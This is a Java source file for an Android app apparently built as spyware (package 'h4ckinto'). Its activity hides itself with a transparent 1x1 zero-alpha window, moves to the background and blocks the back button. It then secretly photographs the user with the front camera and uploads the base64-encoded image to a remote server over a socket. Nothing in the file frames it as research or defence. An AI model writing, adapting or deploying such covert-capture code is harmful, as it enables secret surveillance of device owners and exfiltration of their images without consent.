package com.h4ckinto.android;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.WindowManager;

import androidx.core.content.ContextCompat;

import com.h4ckinto.android.network.SocketManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

/**
 * Transparent activity to capture camera photo in background
 * This is needed because Android blocks camera access from services
 */
public class TransparentCameraActivity extends Activity {
    
    private static final String TAG = "TransparentCameraActivity";
    private Camera camera;
    private boolean photoTaken = false;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make activity completely transparent and invisible
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        
        // Make window transparent
        getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        
        // Set window size to 1x1 pixel (practically invisible)
        WindowManager.LayoutParams params = getWindow().getAttributes();
        params.width = 1;
        params.height = 1;
        params.alpha = 0.0f;
        getWindow().setAttributes(params);
        
        // Move to background immediately
        moveTaskToBack(true);
        
        Log.d(TAG, "TransparentCameraActivity started - taking photo");
        
        // Check permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
            != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted");
            sendError("Camera permission not granted");
            finish();
            return;
        }
        
        // Take photo with delay to ensure window is set up
        new Handler().postDelayed(() -> {
            takePhoto();
        }, 500);
    }
    
    private void takePhoto() {
        new Thread(() -> {
            try {
                // Find front camera
                int frontCameraId = findFrontCameraId();
                if (frontCameraId == -1) {
                    Log.e(TAG, "Front camera not found");
                    sendError("Front camera not found");
                    runOnUiThread(() -> finish());
                    return;
                }
                
                // Open camera
                camera = Camera.open(frontCameraId);
                Log.d(TAG, "Camera opened");
                
                // Set parameters
                Camera.Parameters params = camera.getParameters();
                
                // Set picture size
                android.util.Size bestSize = getBestPictureSize(params);
                if (bestSize != null) {
                    params.setPictureSize(bestSize.getWidth(), bestSize.getHeight());
                }
                
                params.setJpegQuality(85);
                
                // Set focus mode
                java.util.List<String> focusModes = params.getSupportedFocusModes();
                if (focusModes != null && focusModes.contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                    params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                }
                
                camera.setParameters(params);
                
                // Start preview (required)
                camera.setPreviewTexture(new SurfaceTexture(0));
                camera.startPreview();
                
                // Wait for preview to stabilize
                Thread.sleep(800);
                
                // Take picture
                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        Log.d(TAG, "✅ Photo taken successfully: " + data.length + " bytes");
                        photoTaken = true;
                        releaseCamera();
                        processAndSendPhoto(data);
                        
                        // Close activity after photo is sent
                        runOnUiThread(() -> {
                            new Handler().postDelayed(() -> {
                                finish();
                            }, 1000);
                        });
                    }
                });
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error taking photo: " + e.getMessage(), e);
                releaseCamera();
                sendError("Failed to take photo: " + e.getMessage());
                runOnUiThread(() -> finish());
            }
        }).start();
    }
    
    private int findFrontCameraId() {
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    return i;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error finding camera: " + e.getMessage());
        }
        return -1;
    }
    
    private android.util.Size getBestPictureSize(Camera.Parameters parameters) {
        try {
            java.util.List<Camera.Size> sizes = parameters.getSupportedPictureSizes();
            if (sizes == null || sizes.isEmpty()) return null;
            
            int targetWidth = 1280;
            int targetHeight = 720;
            Camera.Size bestSize = null;
            int bestDiff = Integer.MAX_VALUE;
            
            for (Camera.Size size : sizes) {
                if (size.width <= targetWidth && size.height <= targetHeight) {
                    int diff = Math.abs(size.width - targetWidth) + Math.abs(size.height - targetHeight);
                    if (diff < bestDiff) {
                        bestDiff = diff;
                        bestSize = size;
                    }
                }
            }
            
            if (bestSize == null && !sizes.isEmpty()) {
                bestSize = sizes.get(0);
                for (Camera.Size size : sizes) {
                    if (size.width * size.height < bestSize.width * bestSize.height) {
                        bestSize = size;
                    }
                }
            }
            
            return bestSize != null ? new android.util.Size(bestSize.width, bestSize.height) : null;
        } catch (Exception e) {
            return null;
        }
    }
    
    private void processAndSendPhoto(byte[] data) {
        try {
            // Compress photo
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            if (bitmap == null) {
                sendPhotoToServer(data);
                return;
            }
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 75, bos);
            byte[] compressedData = bos.toByteArray();
            bos.close();
            
            Log.d(TAG, "Photo compressed: " + data.length + " → " + compressedData.length + " bytes");
            sendPhotoToServer(compressedData);
            
            if (!bitmap.isRecycled()) {
                bitmap.recycle();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing photo", e);
            sendError("Failed to process photo: " + e.getMessage());
        }
    }
    
    private void sendPhotoToServer(byte[] photoData) {
        try {
            String base64Photo = android.util.Base64.encodeToString(photoData, android.util.Base64.NO_WRAP);
            
            JSONObject photoDataObj = new JSONObject();
            photoDataObj.put("type", "front_camera_photo");
            photoDataObj.put("image", true);
            photoDataObj.put("buffer", base64Photo);
            photoDataObj.put("size", photoData.length);
            photoDataObj.put("timestamp", System.currentTimeMillis());
            photoDataObj.put("camera", "front");
            
            SocketManager.getInstance(getApplicationContext()).sendFileData(photoDataObj);
            Log.d(TAG, "✅ Photo sent to server (" + photoData.length + " bytes)");
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending photo", e);
            sendError("Failed to send photo: " + e.getMessage());
        }
    }
    
    private void sendError(String error) {
        try {
            JSONObject errorData = new JSONObject();
            errorData.put("type", "camera_error");
            errorData.put("error", error);
            errorData.put("timestamp", System.currentTimeMillis());
            SocketManager.getInstance(getApplicationContext()).sendFileData(errorData);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error message", e);
        }
    }
    
    private void releaseCamera() {
        if (camera != null) {
            try {
                camera.stopPreview();
                camera.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing camera", e);
            }
            camera = null;
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        releaseCamera();
        Log.d(TAG, "TransparentCameraActivity destroyed");
    }
    
    @Override
    public void onBackPressed() {
        // Prevent back button
    }
}
